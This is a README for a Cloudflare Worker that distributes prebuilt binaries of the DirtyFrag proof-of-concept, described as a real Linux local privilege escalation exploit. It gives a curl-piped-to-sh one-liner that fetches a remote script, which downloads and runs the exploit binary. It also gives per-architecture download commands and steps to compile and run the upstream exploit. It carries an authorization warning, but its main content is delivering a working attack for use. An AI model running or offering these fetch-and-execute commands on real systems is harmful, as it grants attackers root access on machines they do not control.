# DirtyFrag Worker

A Cloudflare Worker that distributes prebuilt binaries of the
[DirtyFrag](https://github.com/V4bel/dirtyfrag) PoC for
multiple Linux architectures from a single endpoint.

> **Use only on systems you own or have explicit written authorization to
> test.** DirtyFrag is a real local privilege escalation. Running it on a
> machine you don't control is illegal in most jurisdictions.

## How to use

On a Linux box you own, with a kernel in the vulnerable range:

```bash
curl -fsSL https://dirtyfrag.l5z12.dev/ | sh
```

The endpoint serves a small POSIX shell script that detects your architecture
(`uname -m`), downloads the matching static binary, and runs it.

If you'd rather inspect things first — which you should, before piping anything
to `sh` — fetch the pieces separately:

```bash
# See the install script
curl -fsSL https://dirtyfrag.l5z12.dev/install

# Download the binary for your arch directly
curl -fsSL "https://dirtyfrag.l5z12.dev/bin?arch=$(uname -m)" -o dirtyfrag
chmod +x ./dirtyfrag
./dirtyfrag
```

You can also request a specific arch:

```bash
curl -fsSL https://dirtyfrag.l5z12.dev/bin/x86_64  -o dirtyfrag
curl -fsSL https://dirtyfrag.l5z12.dev/bin/aarch64 -o dirtyfrag
curl -fsSL https://dirtyfrag.l5z12.dev/bin/armv7   -o dirtyfrag
curl -fsSL https://dirtyfrag.l5z12.dev/bin/i386    -o dirtyfrag
```

Visiting the URL in a browser redirects to the upstream repository.

## Supported architectures

| Arch    | `uname -m` values mapped to it |
|---------|--------------------------------|
| x86_64  | `x86_64`, `amd64`              |
| aarch64 | `aarch64`, `arm64`             |
| armv7   | `armv7l`, `armv7`, `armhf`     |
| i386    | `i386`, `i486`, `i586`, `i686` |

All binaries are statically linked against musl (built with `zig cc`), so they
have no libc dependency and run on any reasonably modern Linux kernel.

## Building from source

If you'd rather build the exploit yourself instead of trusting prebuilts from a
worker, clone the upstream PoC and compile it directly:

```bash
git clone https://github.com/V4bel/dirtyfrag
cd dirtyfrag
gcc -O2 -static exp.c -o dirtyfrag
./dirtyfrag
```

## Thanks to

- [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag) — original PoC